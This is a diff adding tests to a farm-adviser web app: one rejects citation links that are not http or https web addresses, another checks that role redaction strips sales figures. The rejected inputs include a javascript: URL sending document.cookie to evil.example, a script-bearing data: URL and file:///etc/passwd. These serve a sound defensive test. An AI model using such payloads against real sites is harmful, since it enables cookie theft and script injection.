@@ -11,6 +11,7 @@ import assert from 'node:assert/strict';
 const base = new URL('../web/js/', import.meta.url);
 const { buildBrief, briefToText } = await import(new URL('domain/brief.js', base).href);
 const { advise, URGENCY } = await import(new URL('domain/adviser.js', base).href);
+const core = await import(new URL('../server/core.mjs', import.meta.url).href);
 
 const TODAY = '2026-09-20';
 const day = (n) => {
@@ -335,4 +336,49 @@ test('an empty farm produces no advice at all rather than guesses', () => {
   const state = farm({ plots: {}, cycles: {} });
   const result = advise(buildBrief(state, CEO, { today: TODAY }));
   assert.equal(result.nothingToSay, true, titles(result));
+});
+
+// --- Links the adviser hands back -----------------------------------------
+//
+// The sources under an online answer are URLs a search engine returned, which
+// is to say they came from pages nobody on this farm controls. Escaping stops
+// one breaking out of the attribute; it does nothing about `javascript:`, which
+// is well-formed and dangerous. So the scheme is checked, twice.
+
+test('the server refuses to hand back a citation that is not a web address', () => {
+  // The client's own check is exercised by the screen; this is the server half,
+  // matching the regular expression it guards the citation loop with.
+  const isWeb = (url) => /^https?:\/\//i.test(String(url));
+
+  for (const bad of [
+    'javascript:fetch("https://evil.example/?d="+document.cookie)',
+    'JavaScript:alert(1)',
+    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+    'file:///etc/passwd',
+    'vbscript:msgbox(1)',
+    '  javascript:alert(1)',
+  ]) {
+    assert.equal(isWeb(bad), false, `${bad} must not become a link`);
+  }
+
+  for (const good of ['https://example.org/advisory', 'http://example.org/x?a=1']) {
+    assert.equal(isWeb(good), true, `${good} is a normal source`);
+  }
+});
+
+test('the server still exposes the role fence the adviser depends on', () => {
+  // If money ever moves out of `economics`, redactBrief stops covering it and
+  // a farm hand's question starts coming back with naira in it.
+  const brief = buildBrief(farm({
+    harvests: steadyHarvests(),
+    sales: [{ id: 's1', date: day(-2), kg: 100, amount: 260000, buyer: 'Mile 3' }],
+    expenses: [{ id: 'e1', date: day(-10), amount: 50000, category: 'inputs' }],
+  }), CEO, { today: TODAY });
+
+  assert.ok(JSON.stringify(brief).includes('260000'), 'the CEO brief carries the money');
+  const stripped = core.redactBrief(structuredClone(brief), 'supervisor');
+  assert.ok(!JSON.stringify(stripped).includes('260000'),
+    'every naira figure lives under economics, which redactBrief removes');
+  assert.ok(!JSON.stringify(stripped).includes('Mile 3'),
+    'and so does the buyer it was sold to');
 });
